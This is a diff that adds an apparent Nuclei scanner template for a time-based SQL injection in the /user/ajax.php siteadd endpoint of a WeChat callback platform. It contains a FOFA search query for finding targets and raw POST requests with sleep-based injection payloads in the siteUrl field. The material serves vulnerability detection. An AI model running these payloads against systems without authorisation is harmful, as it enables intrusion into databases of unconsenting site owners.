@@ -1,0 +1,38 @@
+id: wxgongzhonghuidiao-user_ajax-sql
+
+info:
+  name: 微信公众平台无限回调系统 /user/ajax.php SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="mb-5 web-font-desc"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /user/ajax.php?act=siteadd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        siteUrl=';select sleep(4)#'
+
+      - |
+        POST /user/ajax.php?act=siteadd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        siteUrl=';select sleep(8)#'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and  
+
+
+
+
+
+
